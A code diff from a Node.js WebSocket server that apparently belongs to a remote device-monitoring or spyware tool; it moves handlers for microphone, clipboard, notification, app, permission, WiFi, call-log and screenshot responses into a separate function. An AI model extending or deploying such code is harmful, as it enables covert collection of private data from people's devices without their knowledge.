@@ -71,36 +71,6 @@ wss.on('connection', (ws) => {
         console.log(`Device ${deviceId} went offline`);
         break;
       }
-      case 'microphone_response':
-        handleMicrophoneResponse(ws, message.data);
-        console.log('Microphone data received from device');
-        break;
-        
-      case 'clipboard_response':
-        handleClipboardResponse(ws, message.data);
-        console.log('Clipboard data received from device');
-        break;
-        
-      case 'notifications_response':
-        handleNotificationsResponse(ws, message.data);
-        console.log('Notifications received from device');
-        break;
-        
-      case 'apps_response':
-        handleAppsResponse(ws, message.data);
-        console.log('Apps list received from device');
-        break;
-        
-      case 'permissions_response':
-        handlePermissionsResponse(ws, message.data);
-        console.log('Permissions received from device');
-        break;
-        
-      case 'wifi_response':
-        handleWifiResponse(ws, message.data);
-        console.log('WiFi networks received from device');
-        break;
-      
     }
   });
 });
@@ -168,6 +138,36 @@ function handleDeviceMessage(ws, message) {
     case 'call_log_response':
       updateDeviceData(ws, 'callLog', message.data);
       console.log('Call log updated for device');
+      break;
+      
+    case 'microphone_response':
+      handleMicrophoneResponse(ws, message.data);
+      console.log('Microphone data received from device');
+      break;
+      
+    case 'clipboard_response':
+      handleClipboardResponse(ws, message.data);
+      console.log('Clipboard data received from device');
+      break;
+      
+    case 'notifications_response':
+      handleNotificationsResponse(ws, message.data);
+      console.log('Notifications received from device');
+      break;
+      
+    case 'apps_response':
+      handleAppsResponse(ws, message.data);
+      console.log('Apps list received from device');
+      break;
+      
+    case 'permissions_response':
+      handlePermissionsResponse(ws, message.data);
+      console.log('Permissions received from device');
+      break;
+      
+    case 'wifi_response':
+      handleWifiResponse(ws, message.data);
+      console.log('WiFi networks received from device');
       break;
       
     case 'screenshot_response':
